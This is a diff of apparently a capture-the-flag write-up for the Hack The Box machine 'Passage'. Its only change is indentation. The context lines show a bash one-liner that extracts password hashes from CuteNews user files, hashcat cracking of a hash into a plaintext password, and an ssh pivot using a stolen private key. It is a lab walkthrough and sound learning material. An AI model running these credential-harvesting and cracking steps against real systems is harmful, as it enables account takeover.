@@ -26,7 +26,7 @@ This machine is currently active, and is my first attempt at HTB.  Its IP addres
     
     for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2>/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
     
-  You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `while read`, as I think that has the same content.
+You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `while read`, as I think that has the same content.
   12. You will now need to choose a hash and decode it.  For me, `paul`'s hash worked.  I checked `hash-identify` to see that it was likely `SHA-256`, and thus ran `hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"`: we see the password is `atlanta1`.  (Thank you, Paul, for having a terrible password);
   13. Login as Paul; `su paul`&mdash;using the password we found above.  Capture an intermediate flag: `cat ~/user.txt`;
   14. As Paul seems to have access to admin's (`nadav`'s) account via `ssh`, we can run `ssh -i ~/.ssh/id_rsa nadav@passage`; now we are pretending to be `nadav`;
